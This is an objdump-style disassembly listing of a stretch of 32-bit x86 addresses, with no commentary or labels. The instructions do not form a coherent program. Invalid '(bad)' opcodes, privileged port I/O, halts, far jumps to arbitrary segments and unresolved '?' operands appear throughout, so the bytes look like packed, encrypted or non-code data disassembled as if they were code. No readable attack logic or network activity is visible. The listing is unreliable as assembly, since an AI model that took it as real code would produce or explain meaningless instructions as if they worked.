  40ce1a:	test   BYTE PTR [eax+0x3eb8b8e9],dh
  40ce20:	scas   eax,DWORD PTR es:[edi]
  40ce21:	push   ds
  40ce22:	xor    al,0x15
  40ce24:	shl    DWORD PTR [esi+0x74970097],cl
  40ce2a:	xor    eax,0xe3cdb5c5
  40ce2f:	cmp    dl,dh
  40ce31:	xor    eax,0xaf804a18
  40ce36:	jmp    0x5f67:0x267d38ea
  40ce3d:	mov    eax,0xb52a1809
  40ce42:	xchg   ebx,ecx
  40ce44:	mov    al,ds:0xfede21c8
  40ce49:	std    
  40ce4a:	add    eax,0x12e1e468
  40ce4f:	bnd js 0x40ce05
  40ce52:	mov    ecx,0x2933c795
  40ce57:	daa    
  40ce58:	and    bl,dh
  40ce5a:	sub    ebp,DWORD PTR [esi+0xd6706f9]
  40ce60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce61:	(bad)  
  40ce62:	xchg   edi,eax
  40ce63:	pop    es
  40ce64:	mov    ebx,DWORD PTR [ebx]
  40ce66:	jge    0x40cec3
  40ce68:	pop    es
  40ce69:	das    
  40ce6a:	xor    cl,BYTE PTR [ebx]
  40ce6c:	xrelease mov DWORD PTR [edi],eax
  40ce6f:	push   edx
  40ce70:	ret    0xa17c
  40ce73:	out    dx,al
  40ce74:	mul    DWORD PTR [ecx+0x3c082b5f]
  40ce7a:	in     eax,dx
  40ce7b:	cmp    cl,dh
  40ce7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7e:	imul   edx,edx,0x1c
  40ce81:	mov    ch,0xaf
  40ce83:	mov    dl,0x2e
  40ce85:	shr    DWORD PTR [edi+0x12],1
  40ce88:	xor    al,0xe8
  40ce8a:	stc    
  40ce8b:	cmp    edi,esp
  40ce8d:	mov    eax,esp
  40ce8f:	add    DWORD PTR [esi],eax
  40ce91:	mov    edx,0xf6d58c87
  40ce96:	aad    0x2c
  40ce98:	add    eax,0xaf4dcbc
  40ce9d:	ja     0x40cf13
  40ce9f:	mov    BYTE PTR [edx-0xdcfc2fe],bl
  40cea5:	inc    ecx
  40cea6:	lock cmp eax,0x7592f51a
  40ceac:	fwait
  40cead:	push   edi
  40ceae:	(bad)  
  40ceaf:	pop    ss
  40ceb0:	add    BYTE PTR [edx+0x4f16d17a],al
  40ceb6:	mov    dh,BYTE PTR [ebp+0x3c95c0b]
  40cebc:	add    edi,edx
  40cebe:	xor    eax,DWORD PTR [ecx+0x21e4292d]
  40cec4:	xchg   ecx,eax
  40cec5:	xchg   esp,eax
  40cec6:	jae    0x40cf14
  40cec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cec9:	sub    al,0xbd
  40cecb:	call   DWORD PTR [edi+edx*2-0x2b]
  40cecf:	retf   
  40ced0:	in     eax,0x48
  40ced2:	pusha  
  40ced3:	mov    DWORD PTR [edi],edi
  40ced5:	cmp    eax,ecx
  40ced7:	dec    ecx
  40ced8:	dec    edi
  40ced9:	fst    QWORD PTR gs:[esi-0xbb65344]
  40cee0:	and    BYTE PTR [edx],0x26
  40cee3:	lods   eax,DWORD PTR ds:[esi]
  40cee4:	retf   0xcd7f
  40cee7:	jo     0x40cf4e
  40cee9:	mov    cl,0xc
  40ceeb:	std    
  40ceec:	cwde   
  40ceed:	push   ecx
  40ceee:	in     eax,0x80
  40cef0:	mov    ch,0xbf
  40cef2:	mov    esi,0xfb668749
  40cef7:	(bad)  
  40cef8:	arpl   WORD PTR [eax+eiz*2-0x19],dx
  40cefc:	test   DWORD PTR [ebp+0x55],ebp
  40ceff:	cmp    al,0x64
  40cf01:	mov    ecx,0x85b003ee
  40cf06:	push   esp
  40cf07:	pop    ss
  40cf08:	sbb    eax,edx
  40cf0a:	popf   
  40cf0b:	sbb    ecx,DWORD PTR [ebx+0x47]
  40cf0e:	cmp    al,0x5a
  40cf10:	adc    eax,0x9798e396
  40cf15:	pop    es
  40cf16:	clc    
  40cf17:	mov    ah,0xae
  40cf19:	cmp    BYTE PTR [ebx],ah
  40cf1b:	pop    ds
  40cf1c:	mov    esi,0xeab8c7a8
  40cf21:	loop   0x40cf8b
  40cf23:	mov    al,0x9f
  40cf25:	imul   ebp,DWORD PTR [ecx-0x59],0xffffffed
  40cf29:	cs call 0x991eaa40
  40cf2f:	(bad)  
  40cf30:	mov    ebp,0xfcb808e1
  40cf35:	(bad)  
  40cf36:	in     eax,dx
  40cf37:	ret    
  40cf38:	adc    eax,DWORD PTR [edi-0x60ab6bbe]
  40cf3e:	loope  0x40cf9f
  40cf40:	test   al,0xc
  40cf42:	push   ecx
  40cf43:	ret    0xda44
  40cf46:	mov    al,ds:0xe2482d27
  40cf4b:	les    eax,FWORD PTR [eax]
  40cf4d:	push   edx
  40cf4e:	scas   al,BYTE PTR es:[edi]
  40cf4f:	push   0x65
  40cf51:	test   dh,ah
  40cf53:	push   ebp
  40cf54:	sbb    BYTE PTR [ebx+0xd],dh
  40cf57:	inc    ebx
  40cf58:	stos   BYTE PTR es:[edi],al
  40cf59:	sbb    eax,0x85bc8241
  40cf5e:	sti    
  40cf5f:	jne    0x40cf6c
  40cf61:	dec    edi
  40cf62:	mov    ds:0x78a46d,eax
  40cf67:	cmc    
  40cf68:	daa    
  40cf69:	in     al,0xd5
  40cf6b:	lock ds push 0xffffff9d
  40cf6f:	inc    ecx
  40cf70:	jbe    0x40cf56
  40cf72:	lods   eax,DWORD PTR ds:[esi]
  40cf73:	imul   DWORD PTR [ecx-0x3bc54bd6]
  40cf79:	jl     0x40cf8b
  40cf7b:	cmp    edi,edx
  40cf7d:	sub    BYTE PTR ds:0x9dce5e5b,bh
  40cf83:	fwait
  40cf84:	outs   dx,BYTE PTR ds:[esi]
  40cf85:	lds    esi,FWORD PTR [edi-0xb]
  40cf88:	and    eax,0x800e173
  40cf8d:	inc    esi
  40cf8e:	sbb    BYTE PTR [eax+eax*2-0x4],dl
  40cf92:	out    dx,al
  40cf93:	jb     0x40cf4c
  40cf95:	mov    edx,eax
  40cf97:	sub    BYTE PTR [ecx+0x4b],dl
  40cf9a:	xor    ah,BYTE PTR [eax]
  40cf9c:	sahf   
  40cf9d:	add    DWORD PTR [ebp-0x3a],0x561fdf69
  40cfa4:	sub    esi,DWORD PTR [edx]
  40cfa6:	mov    bh,0x3c
  40cfa8:	mov    ebx,0x297a176b
  40cfad:	aas    
  40cfae:	pushf  
  40cfaf:	loop   0x40d02e
  40cfb1:	inc    DWORD PTR [esi-0x1d]
  40cfb4:	xchg   esi,eax
  40cfb5:	mov    ch,0x7b
  40cfb7:	imul   esp,DWORD PTR [ebx+0xe],0x6b
  40cfbb:	cmp    esi,esi
  40cfbd:	test   al,0xde
  40cfbf:	sbb    edi,ecx
  40cfc1:	jne    0x40cffb
  40cfc3:	and    dl,ah
  40cfc5:	inc    esp
  40cfc6:	mov    bl,0xe3
  40cfc8:	jl     0x40cf98
  40cfca:	lods   eax,DWORD PTR ds:[esi]
  40cfcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfcc:	dec    DWORD PTR [eax]
  40cfce:	push   es
  40cfcf:	lock or BYTE PTR [bx+di+0x6b7e],0x99
  40cfd6:	inc    edx
  40cfd7:	xchg   ebp,eax
  40cfd8:	sbb    al,0x33
  40cfda:	fwait
  40cfdb:	or     BYTE PTR [ebx+0x7dbb18c2],dl
  40cfe1:	add    ebx,0x27
  40cfe4:	or     edx,DWORD PTR [eax+edx*2+0x708630f3]
  40cfeb:	or     DWORD PTR [eax-0x4cc39bcb],edx
  40cff1:	sti    
  40cff2:	cmp    ebx,DWORD PTR [edi-0x6b]
  40cff5:	xor    al,0xbc
  40cff7:	pop    esi
  40cff8:	js     0x40cfac
  40cffa:	mov    edi,0xa49dc145
  40cfff:	fisub  WORD PTR [edi-0x1a2e4d52]
  40d005:	mov    ds:0x2ee96148,eax
  40d00a:	data16 arpl cx,bx
  40d00d:	inc    eax
  40d00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d00f:	pop    ebp
  40d010:	mov    esp,0x7569ed56
  40d015:	test   al,0xe0
  40d017:	out    dx,eax
  40d018:	mov    cl,0x7d
  40d01a:	xchg   ebp,eax
  40d01b:	adc    dl,BYTE PTR [ebp+0x68b05c55]
  40d021:	and    al,0xb6
  40d023:	(bad)  
  40d024:	retf   
  40d025:	sub    edi,DWORD PTR [esi+0x21c6675c]
  40d02b:	test   BYTE PTR [eax+0x77b15fb7],cl
  40d031:	xchg   BYTE PTR [ebp-0x78],bh
  40d034:	cwde   
  40d035:	xlat   BYTE PTR ds:[ebx]
  40d036:	push   eax
  40d037:	mov    eax,0xbfd7e3f1
  40d03c:	loopne 0x40cfd4
  40d03e:	push   esp
  40d03f:	adc    DWORD PTR ds:0x210ed19d,edi
  40d045:	pop    ebp
  40d046:	scas   eax,DWORD PTR es:[edi]
  40d047:	mov    ch,0x33
  40d049:	xor    BYTE PTR [edi],cl
  40d04b:	test   DWORD PTR [edi-0x70a7d79b],0xfe22313f
  40d055:	out    dx,al
  40d056:	arpl   WORD PTR [ecx],dx
  40d058:	jmp    0x40d01a
  40d05a:	cdq    
  40d05b:	dec    eax
  40d05c:	test   al,0xfa
  40d05e:	sub    bl,BYTE PTR [edx-0xb]
  40d061:	lods   al,BYTE PTR ds:[esi]
  40d062:	stc    
  40d063:	push   ds
  40d064:	pop    edi
  40d065:	int    0x43
  40d067:	scas   al,BYTE PTR es:[edi]
  40d068:	js     0x40d0a5
  40d06a:	sub    BYTE PTR [ebx-0x756263bf],0x86
  40d071:	jnp    0x40d0d3
  40d073:	pushf  
  40d074:	xchg   edx,eax
  40d075:	jno    0x40d0b4
  40d077:	add    eax,0xb307cb89
  40d07c:	les    edx,FWORD PTR [eax]
  40d07e:	jge    0x40d071
  40d080:	xor    BYTE PTR [edx+0x4a680794],0x50
  40d087:	call   0x1b3d8e9a
  40d08c:	or     ch,BYTE PTR [ebx+ebp*8]
  40d08f:	xor    eax,0xac4b8ab5
  40d094:	pop    edx
  40d095:	aas    
  40d096:	mov    al,0x95
  40d098:	xchg   BYTE PTR [edi],ah
  40d09a:	mov    esp,0x9ff09ec1
  40d09f:	out    dx,al
  40d0a0:	adc    esp,DWORD PTR [eax+0x6bdd1595]
  40d0a6:	inc    ebp
  40d0a7:	data16 loop 0x40d033
  40d0aa:	and    DWORD PTR [edx],ebx
  40d0ac:	pop    ds
  40d0ad:	daa    
  40d0ae:	sub    BYTE PTR [edi],0xb3
  40d0b1:	rcl    DWORD PTR [ebp+0x25243ec4],1
  40d0b7:	in     al,0xd4
  40d0b9:	lods   al,BYTE PTR ds:[esi]
  40d0ba:	pop    ebx
  40d0bb:	jne    0x40d04f
  40d0bd:	retf   0x939c
  40d0c0:	dec    esi
  40d0c1:	fcom   QWORD PTR [esi]
  40d0c3:	shr    BYTE PTR [edi+eiz*1+0x7357d53f],cl
  40d0ca:	jle    0x40d126
  40d0cc:	pop    ecx
  40d0cd:	div    dh
  40d0cf:	rol    bl,cl
  40d0d1:	inc    ebp
  40d0d2:	cmp    BYTE PTR [edi-0x3e350ce],ah
  40d0d8:	mov    ah,0x6f
  40d0da:	jp     0x40d102
  40d0dc:	mov    bl,0x81
  40d0de:	and    al,0xae
  40d0e0:	dec    edi
  40d0e1:	loope  0x40d088
  40d0e3:	fs in  eax,dx
  40d0e5:	loop   0x40d10a
  40d0e7:	mov    dh,BYTE PTR [edx-0x41a94c33]
  40d0ed:	pop    ecx
  40d0ee:	mov    cs,WORD PTR [si+0x60d2]
  40d0f3:	jo     0x40d0e3
  40d0f5:	repz mov al,ds:0xd20e89d5
  40d0fb:	dec    eax
  40d0fc:	adc    bl,BYTE PTR [edi-0x5fe074f2]
  40d102:	cli    
  40d103:	into   
  40d104:	add    ecx,edi
  40d106:	pushf  
  40d107:	out    0x28,al
  40d109:	cdq    
  40d10a:	and    DWORD PTR [ecx+0x24],0x48434f48
  40d111:	and    DWORD PTR [eax+0x23],edx
  40d114:	imul   ebp,edi,0xffffffb9
  40d117:	mov    WORD PTR [esi+0x54],ss
  40d11a:	push   ebp
  40d11b:	fisub  WORD PTR [edx+edx*2]
  40d11e:	xor    eax,0x4879a591
  40d123:	pop    esp
  40d124:	jle    0x40d0f8
  40d126:	hlt    
  40d127:	mov    cl,0xa6
  40d129:	es cli 
  40d12b:	das    
  40d12c:	pop    ds
  40d12d:	bound  esp,QWORD PTR ds:0x628a2a3
  40d133:	xchg   si,ax
  40d135:	mov    al,ds:0xd1e0e496
  40d13a:	ja     0x40d137
  40d13c:	sub    ebx,DWORD PTR [eax+0x5e]
  40d13f:	jo     0x40d1b5
  40d141:	shr    DWORD PTR [ebx+ebp*8],cl
  40d144:	push   esi
  40d145:	cmp    edx,ecx
  40d147:	out    0xfc,eax
  40d149:	rol    al,cl
  40d14b:	xor    DWORD PTR [ebp+esi*8-0x44],eax
  40d14f:	mov    ch,0x36
  40d151:	(bad)  
  40d152:	xchg   edi,eax
  40d153:	and    DWORD PTR [eax+ebp*2+0x21a0174],ebp
  40d15a:	and    ah,bh
  40d15c:	adc    DWORD PTR [edx-0x665d4e92],ebx
  40d162:	(bad)  
  40d163:	mov    al,0x9c
  40d165:	fldcw  WORD PTR [edx+ecx*2]
  40d168:	mov    WORD PTR [ebp+0x14aa14cc],cs
  40d16e:	mov    cl,0xfd
  40d170:	add    DWORD PTR [ecx],edx
  40d172:	scas   eax,DWORD PTR es:[edi]
  40d173:	mov    ebx,0x88e4593f
  40d178:	dec    edi
  40d179:	call   0x28011a1
  40d17e:	jl     0x40d1ad
  40d180:	outs   dx,DWORD PTR ds:[esi]
  40d181:	in     al,0x30
  40d183:	rol    eax,1
  40d185:	div    DWORD PTR [ebp+eax*8+0x32c32057]
  40d18c:	jmp    0x40d137
  40d18e:	fcmovnb st,st(0)
  40d190:	fdivr  DWORD PTR [esi]
  40d192:	xchg   BYTE PTR [ecx+0x6a85b84e],bl
  40d198:	aas    
  40d199:	push   ss
  40d19a:	mov    ds:0x1e30f0d5,al
  40d19f:	pop    ebp
  40d1a0:	sar    DWORD PTR [esi-0x54],0x25
  40d1a4:	mov    ebx,0x67984447
  40d1a9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40d1ab:	sbb    ebp,DWORD PTR [edx+esi*8-0x70]
  40d1af:	adc    al,0x5a
  40d1b1:	hlt    
  40d1b2:	jg     0x40d192
  40d1b4:	ja     0x40d196
  40d1b6:	push   esi
  40d1b7:	pop    ss
  40d1b8:	gs sti 
  40d1ba:	pusha  
  40d1bb:	call   0xa80b8002
  40d1c0:	cmp    cl,ch
  40d1c2:	inc    ebx
  40d1c3:	xor    cl,BYTE PTR [edx]
  40d1c5:	mov    esp,0xb0bcf692
  40d1ca:	mov    ebx,0x82ad786b
  40d1cf:	cmp    dl,ch
  40d1d1:	jno    0x40d1e7
  40d1d3:	ds xchg ebp,eax
  40d1d5:	shr    BYTE PTR [esi+0x53],cl
  40d1d8:	sbb    BYTE PTR [edx],ch
  40d1da:	call   0x97a488f2
  40d1df:	adc    al,0x1a
  40d1e1:	outs   dx,DWORD PTR ds:[esi]
  40d1e2:	cmc    
  40d1e3:	xchg   ecx,eax
  40d1e4:	inc    esi
  40d1e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e6:	fsub   QWORD PTR [edi-0x112997ad]
  40d1ec:	lock aaa 
  40d1ee:	pop    es
  40d1ef:	jne    0x40d22d
  40d1f1:	push   eax
  40d1f2:	ss xchg edi,eax
  40d1f4:	int3   
  40d1f5:	je     0x40d23e
  40d1f7:	and    ecx,DWORD PTR [esi]
  40d1f9:	loope  0x40d23f
  40d1fb:	and    eax,0x7e20ee28
  40d200:	mov    dl,0xef
  40d202:	(bad)  
  40d203:	adc    esi,edx
  40d205:	pop    ds
  40d206:	shl    BYTE PTR [ebx+0x5d88916e],cl
  40d20c:	dec    esp
  40d20d:	cmp    DWORD PTR [ecx],ecx
  40d20f:	mov    esp,eax
  40d211:	pop    eax
  40d212:	or     eax,0x507c5965
  40d217:	push   esp
  40d218:	inc    ebx
  40d219:	mov    esi,0x3de8ad4a
  40d21e:	test   al,0x8c
  40d220:	pop    edi
  40d221:	test   BYTE PTR [eax],0x6b
  40d224:	cmp    BYTE PTR [ecx],ah
  40d226:	or     esp,DWORD PTR [ecx+edi*2]
  40d229:	add    edx,DWORD PTR es:[edi]
  40d22c:	(bad)  
  40d22d:	(bad)  
  40d22e:	inc    esp
  40d22f:	dec    ebp
  40d230:	psllw  mm6,mm4
  40d233:	loope  0x40d238
  40d235:	icebp  
  40d236:	mov    ebx,0xa5ebd7f5
  40d23b:	xchg   edx,eax
  40d23c:	adc    ch,ch
  40d23e:	cmp    edi,DWORD PTR [edi-0x1b]
  40d241:	adc    DWORD PTR [esp+ebx*1],ecx
  40d244:	jns    0x40d249
  40d246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d247:	mov    ebp,0x227122a9
  40d24c:	fwait
  40d24d:	sub    eax,0x9c0a7d6a
  40d252:	mov    dl,0x34
  40d254:	scas   eax,DWORD PTR es:[edi]
  40d255:	or     ecx,DWORD PTR [eax]
  40d257:	mov    al,ds:0xa5018228
  40d25c:	ds stos DWORD PTR es:[edi],eax
  40d25e:	push   es
  40d25f:	popf   
  40d260:	cld    
  40d261:	mov    bh,0x2c
  40d263:	pop    edx
  40d264:	icebp  
  40d265:	mov    bh,0xdb
  40d267:	outs   dx,DWORD PTR ds:[esi]
  40d268:	call   0xc4480ad3
  40d26d:	mov    ds,WORD PTR [eax+0x5d7590d]
  40d273:	daa    
  40d274:	ds ins BYTE PTR es:[edi],dx
  40d276:	lea    esp,[ecx+0xb057696]
  40d27c:	lods   eax,DWORD PTR ds:[esi]
  40d27d:	daa    
  40d27e:	stc    
  40d27f:	sahf   
  40d280:	cmp    DWORD PTR [edi+0x2a],esp
  40d283:	js     0x40d2f8
  40d285:	pop    ebx
  40d286:	add    BYTE PTR [esi+0x31330b87],0xef
  40d28d:	enter  0x6328,0x76
  40d291:	cmp    ah,bl
  40d293:	and    eax,DWORD PTR [edi]
  40d295:	push   0xd662d8ea
  40d29a:	add    eax,0x2fb18a9f
  40d29f:	and    eax,0xe083a700
  40d2a4:	mov    edi,0x37eea7ac
  40d2a9:	push   ebx
  40d2aa:	in     al,0x1b
  40d2ac:	jmp    0x657f:0x4a620531
  40d2b3:	popf   
  40d2b4:	rcr    BYTE PTR [eax],1
  40d2b6:	gs fwait
  40d2b8:	jb     0x40d270
  40d2ba:	into   
  40d2bb:	push   esp
  40d2bc:	mov    bl,0xf0
  40d2be:	mov    dl,0x64
  40d2c0:	jmp    0x4699:0x6c3ff078
  40d2c7:	jg     0x40d2ad
  40d2c9:	mov    esi,0x7a4684a9
  40d2ce:	add    eax,0xe5576abb
  40d2d3:	or     al,0x2a
  40d2d5:	sub    ebp,DWORD PTR [edi-0x65efd98e]
  40d2db:	pop    ebx
  40d2dc:	push   eax
  40d2dd:	mov    ah,0xdc
  40d2df:	fadd   DWORD PTR [esi-0x42]
  40d2e2:	arpl   ax,ax
  40d2e4:	mov    dh,0xae
  40d2e6:	popa   
  40d2e7:	clc    
  40d2e8:	(bad)  
  40d2e9:	mov    eax,ds:0xc4f0180b
  40d2ee:	and    ch,cl
  40d2f0:	push   edi
  40d2f1:	sbb    DWORD PTR [esp+esi*8],eax
  40d2f4:	cmp    al,0x35
  40d2f6:	dec    edx
  40d2f7:	xchg   BYTE PTR [eax+0x3d],bl
  40d2fa:	mov    bh,BYTE PTR [ebx+0x39f51241]
  40d300:	jnp    0x40d2e0
  40d302:	loope  0x40d2bb
  40d304:	aam    0xa
  40d306:	mov    edx,0x81e4b7d8
  40d30b:	push   0x179bfd75
  40d310:	cld    
  40d311:	mov    ch,0x2e
  40d313:	cmp    esi,DWORD PTR gs:[ebx+0x624c741f]
  40d31a:	test   DWORD PTR [edi],esi
  40d31c:	scas   al,BYTE PTR es:[edi]
  40d31d:	in     al,dx
  40d31e:	aam    0x23
  40d320:	adc    DWORD PTR [ecx+0x20],ebx
  40d323:	jp     0x40d2ae
  40d325:	inc    ebx
  40d326:	sub    DWORD PTR [eax+0x4],ebx
  40d329:	ja     0x40d2e5
  40d32b:	jno    0x40d2d3
  40d32d:	pop    edi
  40d32e:	cwde   
  40d32f:	push   ds
  40d330:	in     eax,dx
  40d331:	mov    edx,0xf6034cb6
  40d336:	mov    al,ds:0x472a40dc
  40d33b:	jp     0x40d347
  40d33d:	and    al,0xe
  40d33f:	fstp   DWORD PTR [edx-0x54acecc2]
  40d345:	mov    WORD PTR [eax+esi*1-0x266be9da],?
  40d34c:	add    esi,esp
  40d34e:	jnp    0x40d2fc
  40d350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d351:	fwait
  40d352:	xchg   ecx,eax
  40d353:	(bad)  
  40d354:	inc    ebx
  40d355:	(bad)  
  40d356:	cmc    
  40d357:	xchg   edi,eax
  40d358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d359:	and    al,0x10
  40d35b:	add    cl,BYTE PTR [ebp+ebp*2+0x1a44fb1c]
  40d362:	xlat   BYTE PTR ds:[ebx]
  40d363:	cmp    al,0x92
  40d365:	sti    
  40d366:	pop    edi
  40d367:	(bad)  
  40d368:	sbb    DWORD PTR [eax+0x19323f11],edi
  40d36e:	imul   ecx,DWORD PTR [esi-0x436e071],0xba923535
  40d378:	sti    
  40d379:	push   ebx
  40d37a:	fs sub al,0x0
  40d37d:	mov    bx,0x7c59
  40d381:	jae    0x40d3e8
  40d383:	sahf   
  40d384:	js     0x40d3d1
  40d386:	mov    ebp,DWORD PTR [esi+0x384e8a10]
  40d38c:	add    eax,0x4f9d39d2
  40d391:	mov    ds:0xed13151c,eax
  40d396:	mov    cl,0xb3
  40d398:	outs   dx,DWORD PTR ds:[esi]
  40d399:	out    dx,eax
  40d39a:	addr16 dec esp
  40d39c:	lods   al,BYTE PTR ds:[esi]
  40d39d:	pushf  
  40d39e:	mov    ebp,0xf1755fe8
  40d3a3:	addr16 mov ds:0xc183,al
  40d3a7:	jb     0x40d417
  40d3a9:	iret   
  40d3aa:	(bad)  
  40d3ab:	shr    ch,0x98
  40d3ae:	lea    ecx,[ebp+0x5fe19018]
  40d3b4:	mov    eax,0x7ba95bb6
  40d3b9:	arpl   ax,bp
  40d3bb:	adc    DWORD PTR es:[eax-0x71],edi
  40d3bf:	jle    0x40d389
  40d3c1:	adc    ebx,DWORD PTR ds:0xe45f615d
  40d3c7:	imul   ebx,DWORD PTR [ecx],0x2b
  40d3ca:	or     dh,bl
  40d3cc:	cmp    DWORD PTR [ebx+0x76171f5b],0x2c
  40d3d3:	jecxz  0x40d38c
  40d3d5:	jns    0x40d3b6
  40d3d7:	lods   al,BYTE PTR ds:[esi]
  40d3d8:	sbb    eax,0x5abce1d8
  40d3dd:	jl     0x40d44e
  40d3df:	(bad)  
  40d3e0:	sbb    al,0x2f
  40d3e2:	cmp    edx,eax
  40d3e4:	jae    0x40d3eb
  40d3e6:	pop    ds
  40d3e7:	into   
  40d3e8:	mov    cs:0xeb90a429,eax
  40d3ee:	and    al,0xf5
  40d3f0:	xor    BYTE PTR [ebx],dh
  40d3f2:	pop    edx
  40d3f3:	mov    WORD PTR [edx+0x17],?
  40d3f6:	inc    ecx
  40d3f7:	(bad)  
  40d3f8:	(bad)  
  40d3f9:	push   es
  40d3fa:	adc    DWORD PTR [edi],0xffffff99
  40d3fd:	fild   QWORD PTR [esp+ebp*4+0x1e]
  40d401:	pop    edx
  40d402:	ja     0x40d453
  40d404:	fistp  WORD PTR [ebp-0x15a00df7]
  40d40a:	dec    edx
  40d40b:	and    BYTE PTR [bx+di],0x6e
  40d40f:	push   esp
  40d410:	int    0x63
  40d412:	shl    BYTE PTR [ebp+0x47edd698],1
  40d418:	repz jno 0x40d453
  40d41b:	xor    dl,dl
  40d41d:	push   ss
  40d41e:	mov    dl,0x40
  40d420:	xchg   DWORD PTR [esi+eax*8],esp
  40d423:	and    al,0x78
  40d425:	xchg   esp,eax
  40d426:	fisub  DWORD PTR [ebp*2+0x6142c89c]
  40d42d:	sub    ebp,DWORD PTR [ecx-0x2d]
  40d430:	push   ss
  40d431:	or     BYTE PTR [ebx-0x1719c5b3],ah
  40d437:	idiv   DWORD PTR ds:0x2cee779
  40d43d:	or     DWORD PTR [ecx],ebx
  40d43f:	leave  
  40d440:	call   0x14ed:0x139e594f
  40d447:	retf   
  40d448:	or     DWORD PTR [edi],ebp
  40d44a:	push   es
  40d44b:	xor    al,0x94
  40d44d:	xchg   ebx,eax
  40d44e:	fldenv [eax+0x22]
  40d451:	xchg   DWORD PTR [ebp+0x53ca43c9],ebp
  40d457:	pop    edi
  40d458:	sub    dh,BYTE PTR ds:[ecx+edi*8+0x426ece3f]
  40d460:	mov    ds:0x34825337,eax
  40d465:	jnp    0x40d4e2
  40d467:	jnp    0x40d474
  40d469:	fld    TBYTE PTR [ebx-0x8]
  40d46c:	add    eax,0x2e5e38fd
  40d471:	mov    ds:0x73c533a1,al
  40d476:	and    eax,DWORD PTR [ebx]
  40d478:	pop    ds
  40d479:	jne    0x40d4f3
  40d47b:	xor    edi,DWORD PTR [edx+esi*4]
  40d47e:	xor    eax,0x8ec4db60
  40d483:	cmp    al,0x12
  40d485:	xor    eax,0x546a7e11
  40d48a:	and    al,0x4b
  40d48c:	mov    eax,0x7b970462
  40d491:	and    BYTE PTR [ebx-0x5b0e8a8f],ah
  40d497:	dec    edi
	...
  40d514:	adc    BYTE PTR [eax-0x20006009],bh
  40d51a:	js     0x40d4db
  40d51c:	shl    BYTE PTR [ebx-0x5e],cl
  40d51f:	mov    ds:0x653ca524,al
  40d524:	fld    QWORD PTR [ebx+0x76c0000]
  40d52a:	add    BYTE PTR [eax],al
  40d52c:	jmp    0x5d01:0x46f2cfb3
  40d533:	push   ebx
  40d534:	or     al,0x28
  40d536:	in     eax,0xcb
  40d538:	push   edi
  40d539:	cmp    esp,DWORD PTR ds:0xa4f99a93
  40d53f:	mov    ds:0xbf626755,al
  40d544:	fdiv   QWORD PTR ds:0x5a97176f
  40d54a:	iret   
  40d54b:	les    edi,FWORD PTR [ecx+0x65]
  40d54e:	sub    DWORD PTR [ebx],ecx
  40d550:	inc    edi
  40d551:	inc    ebx
  40d552:	iret   
  40d553:	cmc    
  40d554:	aam    0x1a
  40d556:	lea    esi,[edx+0x3aff93f1]
  40d55c:	mov    ds:0x1828aad4,al
  40d561:	aad    0x7b
  40d563:	or     al,0x1e
  40d565:	pusha  
  40d566:	test   BYTE PTR ds:[ebp+0x1e],dl
  40d56a:	(bad)  
  40d56b:	cs rcl cl,cl
  40d56e:	loopne 0x40d599
  40d570:	adc    DWORD PTR es:[eax-0x5f],ebp
  40d574:	stos   BYTE PTR es:[edi],al
  40d575:	sub    DWORD PTR [edi],0xffffffe8
  40d578:	jmp    0x279388a7
  40d57d:	test   eax,0x8fb3f94a
  40d582:	lea    ebp,[ecx-0x3d]
  40d585:	push   eax
  40d586:	aad    0x98
  40d588:	push   0x8a973bb8
  40d58d:	lahf   
  40d58e:	and    BYTE PTR [edx-0x74354d90],bl
  40d594:	pop    ebx
  40d595:	xchg   esp,eax
  40d596:	stos   BYTE PTR es:[edi],al
  40d597:	push   ecx
  40d598:	sub    edx,edi
  40d59a:	pop    edi
  40d59b:	imul   BYTE PTR [eax]
  40d59d:	jmp    0x679f:0x4792265a
  40d5a4:	test   eax,0xb9603372
  40d5a9:	sti    
  40d5aa:	cmp    eax,0x6b666a10
  40d5af:	sub    eax,0x596ab6cd
  40d5b4:	xor    eax,DWORD PTR [ecx+0x2002b3a4]
  40d5ba:	push   cs
  40d5bb:	jg     0x40d56d
  40d5bd:	inc    esp
  40d5be:	cmp    DWORD PTR [ebx+0x7f],edx
  40d5c1:	lds    edx,FWORD PTR [ebx+0x36]
  40d5c4:	ror    ah,1
  40d5c6:	pop    ebx
  40d5c7:	and    ebp,0xdb077720
  40d5cd:	(bad)  [edi+0x7544478a]
  40d5d3:	lock xor BYTE PTR [esi+esi*8+0x4b],0x7c
  40d5d9:	test   al,0x57
  40d5db:	ss inc ebx
  40d5dd:	push   es
  40d5de:	or     cl,cl
  40d5e0:	div    BYTE PTR ds:0xda011ce7
  40d5e6:	push   ebx
  40d5e7:	in     eax,dx
  40d5e8:	xlat   BYTE PTR ds:[ebx]
  40d5e9:	or     BYTE PTR [edx-0x1f],ah
  40d5ec:	(bad)  ds:0x98d22b31
  40d5f2:	jnp    0x40d5f9
  40d5f4:	(bad)  
  40d5f5:	jmp    0x40d62a
  40d5f7:	out    dx,eax
  40d5f8:	scas   al,BYTE PTR es:[edi]
  40d5f9:	push   ecx
  40d5fb:	sbb    al,0xbb
  40d5fd:	sub    DWORD PTR [edi+0x78],0xffffffad
  40d601:	shl    DWORD PTR [ebx+0x3d824334],0x81
  40d608:	sar    ecx,1
  40d60a:	mov    cl,0xa1
  40d60c:	push   ecx
  40d60d:	(bad)  
  40d60e:	or     dl,dl
  40d610:	stos   BYTE PTR es:[edi],al
  40d611:	xor    BYTE PTR [ecx],0xd5
  40d614:	and    BYTE PTR [ecx],0xf4
  40d617:	ror    BYTE PTR [edi*8+0x534776cf],0xe8
  40d61f:	mov    cs,WORD PTR [eax+ebp*4]
  40d622:	idiv   DWORD PTR [ecx-0x7c]
  40d625:	jmp    0xe8014331
  40d62a:	inc    eax
  40d62b:	inc    ebx
  40d62c:	call   0xf215d95c
  40d631:	ds mov ecx,0x5ebe62c4
  40d637:	test   BYTE PTR [ebx+eax*8],al
  40d63a:	das    
  40d63b:	push   0xffffffd2
  40d63d:	out    dx,al
  40d63e:	in     al,0x18
